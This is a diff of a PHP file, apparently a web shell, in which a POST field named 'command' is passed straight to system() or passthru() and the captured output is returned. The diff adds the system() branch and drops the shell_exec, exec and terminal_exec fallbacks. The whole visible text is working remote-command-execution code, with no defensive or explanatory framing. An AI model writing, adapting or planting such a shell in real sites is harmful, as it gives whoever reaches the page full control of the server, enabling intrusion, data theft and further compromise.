@@ -54,6 +54,14 @@ function archive($path){
 if (isset( $_POST['command'])):
 	$command = $_POST['command'];
 		// Check functions
+		// Try: system
+		if(function_exists('system'))
+		{
+			ob_start();
+			system($command , $return_var);
+			$output = ob_get_contents();
+			ob_end_clean();
+		}
 		// Try: passthru
 		else if(function_exists('passthru'))
 		{
@@ -62,22 +70,7 @@ if (isset( $_POST['command'])):
 			$output = ob_get_contents();
 			ob_end_clean();
 		}
-		// Try: shell_exec
-		else if(function_exists('shell_exec'))
-		{
-			$output = shell_exec($command);
-		}
-		// Try: exec
-		else if(function_exists('exec'))
-		{
-			exec($command , $output , $return_var);
-			$output = implode("" , $output);
-		}
-		// Try: terminal_exec
-		else if(function_exists('terminal_exec'))
-		{
-			$output = terminal_exec($command) ;
-		}
+	
 		// No function exists
 		else
 		{
